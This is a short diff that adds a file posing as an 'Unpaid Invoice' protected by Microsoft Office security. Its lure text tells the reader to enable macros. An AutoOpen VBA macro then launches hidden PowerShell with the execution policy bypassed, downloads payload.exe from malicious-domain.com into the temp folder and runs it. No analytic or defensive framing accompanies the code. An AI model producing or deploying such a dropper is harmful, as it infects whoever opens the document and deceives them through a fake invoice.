@@ -1,0 +1,8 @@
+This document is protected by Microsoft Office security.
+Please enable macros at the top of the screen to view the Unpaid Invoice.
+
+Sub AutoOpen()
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    ws.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile '%TEMP%\payload.exe'; Start-Process '%TEMP%\payload.exe'""", 0, False
+End Sub
